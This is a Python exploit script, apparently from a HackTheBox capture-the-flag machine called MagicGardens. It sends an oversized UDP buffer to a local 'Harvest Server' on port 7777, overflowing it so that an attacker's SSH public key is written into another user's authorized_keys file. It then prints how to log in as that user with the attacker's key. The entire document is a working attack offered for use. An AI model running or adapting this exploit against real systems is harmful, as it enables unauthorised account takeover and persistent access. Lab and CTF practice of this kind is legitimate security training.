import socket
import time

packets = b"A"
buffer_size = 65372
ssh_key = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmL88TzEw+hU/V+6xCf3NHeduk5HVeTaIKr9TD58n1ge4p5yOXYB8bElyq1Jubgflhu8FbnoMl0wEMJCUP48RmgTyNVnZbsN1ORngYE7CxLi7YzWPtg+uZtTSubmEXJ+i0DS3uFY8wjN9vNzSFyiX2VSUAqYxUtjPqPNwBpatKQ2DdUN2KvvWbZ702bBWx+CUgVR4qR/kmt82EtOKyFeXcXG+wt1AjtIYWVILVIsCW0bbSwxM9rZd5pQ88MfmFId3mTKZZQ8SBuTNbswyTS8JIeLHctAs5MWTpSgUNDvXm5bMxL3Cie6UFNRcbHTijROIAkXIqe7k2Yw+rMMSwcogA47v4/HzO9WrPceaFzBGJbazirprXHXuszqiKIwfLKoFGzHDqSN0Ok9rfUyx1rIl1j9qdrDpVa6cJaiPTFYDyBlQGBSu+JYwmEtbNBUX+fnmPjTKpxQWL7AJrGunPfZCuWXUEl7y2oKu5c9VikfY9feoYvxXOZfLZV4fHAQkn/c8= v0lk3n@k4l1"
break_line = b"\n"
file_path = b"/home/alex/.ssh/authorized_keys"


HOST = '0:0:0:0:0:0:0:1'
PORT = 7777

print("Connecting to Harvest Server...")
server = (HOST, PORT)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server)
print("Connected!\n")

buffer = packets * (buffer_size - len(ssh_key) - len(break_line * 2)) + break_line + ssh_key + break_line + file_path
print("PWN : Buffer Overflow Triggered - authorized_keys CREATED!\n")
print("Connect to alex ssh using your own id_rsa key")
print("Example : ssh -i id_rsa alex@magicgardens.htb")
s.send(buffer)
s.close()

